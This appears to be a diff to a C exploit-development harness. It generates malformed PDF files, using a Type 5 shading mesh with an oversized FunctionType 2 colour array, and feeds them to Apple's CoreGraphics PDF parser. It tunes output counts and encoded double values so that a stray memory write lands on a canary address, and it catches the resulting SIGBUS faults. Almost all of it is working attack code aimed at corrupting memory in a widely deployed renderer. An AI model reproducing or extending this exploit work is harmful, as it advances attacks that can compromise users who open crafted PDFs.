@@ -31722,8 +31722,8 @@ static void r508_7c_only(void) {
 
     /* Test multiple NOUT with VPR=2, single function + dup.
        Small NOUT means tiny dup chain. We need minimum that hits str. */
-    int nout_scan[] = {16, 32, 64, 128, 256};
-    int nscan = 5;
+    int nout_scan[] = {128, 256, 512};
+    int nscan = 3;
     int best_nout = 0;
     uint64_t best_offset = 0;
     int VPR = 2;
@@ -31865,46 +31865,95 @@ static void r508_7c_only(void) {
     rlog("\n  Best: NOUT=%d offset=0x%llx\n", best_nout,
         (unsigned long long)best_offset);
 
-    /* --- Canary test with best_nout --- */
+    /* --- Canary test with FunctionType 2 (exact decimal, no PostScript) --- */
     static volatile uint32_t canary = 0xCAFEBABE;
     uint64_t canary_addr = (uint64_t)(uintptr_t)&canary;
     uint64_t x22_target = canary_addr - best_offset;
     canary = 0xCAFEBABE;
 
     rlog("  canary at %p = 0x%08x\n", (void *)&canary, canary);
-    rlog("  x22_target = 0x%llx\n", (unsigned long long)x22_target);
+    rlog("  x22_target = 0x%llx (offset=0x%llx)\n",
+        (unsigned long long)x22_target, (unsigned long long)best_offset);
 
-    /* Verify denormal encoding in C first */
-    {
-        double test_d = (double)x22_target * pow(2.0, -1074.0);
-        uint64_t test_bits;
-        memcpy(&test_bits, &test_d, 8);
-        rlog("  C verify: %.1f * 2^-1074 = bits 0x%016llx (want 0x%016llx)\n",
-            (double)x22_target, (unsigned long long)test_bits,
-            (unsigned long long)x22_target);
-        /* Also try two-step */
-        double test_d2 = (double)x22_target * pow(2.0, -52.0) * pow(2.0, -1022.0);
-        uint64_t test_bits2;
-        memcpy(&test_bits2, &test_d2, 8);
-        rlog("  C verify 2-step: bits 0x%016llx\n",
-            (unsigned long long)test_bits2);
-    }
+    /* Convert x22_target to its exact IEEE 754 double, then to decimal string */
+    double target_dbl;
+    memcpy(&target_dbl, &x22_target, 8);
+    char valbuf[64];
+    snprintf(valbuf, sizeof(valbuf), "%.20e", target_dbl);
 
-    /* Build function body with two-step denormal encoding
-       mantissa * 2^-52 * 2^-1022 avoids a single extreme exponent */
-    char fbuf[120];
-    snprintf(fbuf, sizeof(fbuf),
-        "{ pop %.1f 2 -52 exp mul 2 -1022 exp mul", (double)x22_target);
-    int fbl2 = (int)strlen(fbuf);
-    char *fbody2 = (char *)malloc((size_t)(fbl2 + best_nout * 4 + 4));
-    memcpy(fbody2, fbuf, (size_t)fbl2);
-    for (int d = 0; d < best_nout - 1; d++) {
-        memcpy(fbody2 + fbl2, " dup", 4); fbl2 += 4;
-    }
-    fbody2[fbl2++] = ' '; fbody2[fbl2++] = '}'; fbody2[fbl2] = '\0';
-
-    rlog("  body len=%d, first 80: %.80s\n", fbl2, fbody2);
+    /* Verify round-trip */
+    double rt;
+    sscanf(valbuf, "%le", &rt);
+    uint64_t rt_bits;
+    memcpy(&rt_bits, &rt, 8);
+    rlog("  target double: %s\n", valbuf);
+    rlog("  round-trip bits: 0x%016llx (want 0x%016llx) %s\n",
+        (unsigned long long)rt_bits, (unsigned long long)x22_target,
+        rt_bits == x22_target ? "OK" : "MISMATCH");
     fflush(stdout);
+
+    /* Build FunctionType 2 PDF: /C0 and /C1 are arrays of best_nout values,
+       all set to target_dbl. /N 1 means constant interpolation (C0=C1). */
+    {
+        int NOUT = best_nout;
+        /* Build value array string: "val val val ..." repeated NOUT times */
+        int vlen = (int)strlen(valbuf);
+        size_t varr_cap = (size_t)NOUT * ((size_t)vlen + 1) + 4;
+        char *varr = (char *)malloc(varr_cap);
+        int varl = 0;
+        for (int i = 0; i < NOUT; i++) {
+            if (i > 0) varr[varl++] = ' ';
+            memcpy(varr + varl, valbuf, (size_t)vlen);
+            varl += vlen;
+        }
+        varr[varl] = '\0';
+
+        /* Build range pairs: "0 4 0 4 0 4 ..." */
+        char *rpairs = (char *)malloc((size_t)NOUT * 4 + 4);
+        int rpl = 0;
+        for (int i = 0; i < NOUT; i++) {
+            if (i > 0) rpairs[rpl++] = ' ';
+            rpairs[rpl++] = '0'; rpairs[rpl++] = ' '; rpairs[rpl++] = '4';
+        }
+        rpairs[rpl] = '\0';
+
+        size_t cap = (size_t)(varl * 2 + rpl + vo + 16384);
+        char *p = (char *)malloc(cap);
+        int pl = 0;
+        pl += snprintf(p+pl, cap-(size_t)pl, "%%PDF-1.7\n%%\xe2\xe3\xcf\xd3\n");
+        int o1=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n");
+        int o2=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n");
+        int o3=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
+            "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n");
+        const char *cstr = " /Sh1 sh\n";
+        int o4=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "4 0 obj\n<< /Length %d >>\nstream\n%s\nendstream\nendobj\n",
+            (int)strlen(cstr), cstr);
+        int o5=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK "
+            "/BitsPerCoordinate 32 /BitsPerComponent 8 /VerticesPerRow %d "
+            "/Decode [0 200 0 200 0 1] /Function 6 0 R /Length %d >>\nstream\n",
+            VPR, vo);
+        memcpy(p+pl, vstream, (size_t)vo); pl += vo;
+        pl += snprintf(p+pl, cap-(size_t)pl, "\nendstream\nendobj\n");
+        int o6=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "6 0 obj\n<< /FunctionType 2 /Domain [0 1] /Range [%s] "
+            "/N 1 /C0 [%s] /C1 [%s] >>\nendobj\n",
+            rpairs, varr, varr);
+        int xo=pl; pl += snprintf(p+pl, cap-(size_t)pl,
+            "xref\n0 7\n0000000000 65535 f \n"
+            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+            "%010d 00000 n \n%010d 00000 n \n%010d 00000 n \n"
+            "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n",
+            o1, o2, o3, o4, o5, o6, xo);
+        rlog("  canary FT2: PDF %d bytes\n", pl);
+        fflush(stdout);
+        pdf_data = p; pdf_len = pl;
+        free(varr); free(rpairs);
+    }
 
     r508_fault_caught = 0;
     r508_fault_addr = 0;
@@ -31912,8 +31961,6 @@ static void r508_7c_only(void) {
     sigaction(SIGBUS, &sa_new, &sa_old_bus);
 
     if (sigsetjmp(r508_jmpbuf, 1) == 0) {
-        BUILD_DUP_PDF(best_nout, fbody2, "canary");
-
         CFDataRef pd = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)pdf_data, (CFIndex)pdf_len);
         CGDataProviderRef dp = CGDataProviderCreateWithCFData(pd);
         CGPDFDocumentRef dc = CGPDFDocumentCreateWithProvider(dp);
@@ -31943,9 +31990,11 @@ static void r508_7c_only(void) {
         rlog("  CRASH FAR=0x%016llx (canary=0x%08x)\n",
             (unsigned long long)r508_fault_addr, canary);
         if (r508_fault_addr == canary_addr)
-            rlog("  *** FAR = canary addr — str hit target! ***\n");
+            rlog("  *** FAR = canary addr — zero-write to canary! ***\n");
+        else if (r508_fault_addr == x22_target + best_offset)
+            rlog("  *** FAR = x22+offset = canary! ***\n");
         else
-            rlog("  expected 0x%016llx, got delta=%lld\n",
+            rlog("  expected 0x%016llx, got FAR delta=%lld\n",
                 (unsigned long long)canary_addr,
                 (long long)(r508_fault_addr - canary_addr));
     }
@@ -31953,7 +32002,7 @@ static void r508_7c_only(void) {
     sigaction(SIGBUS, &sa_old_bus, NULL);
     fflush(stdout);
 
-    free(vstream); free(fbody2);
+    free(vstream);
     #undef BUILD_DUP_PDF
     rlog("\n=== r508_7c_only complete ===\n");
     fflush(stdout);
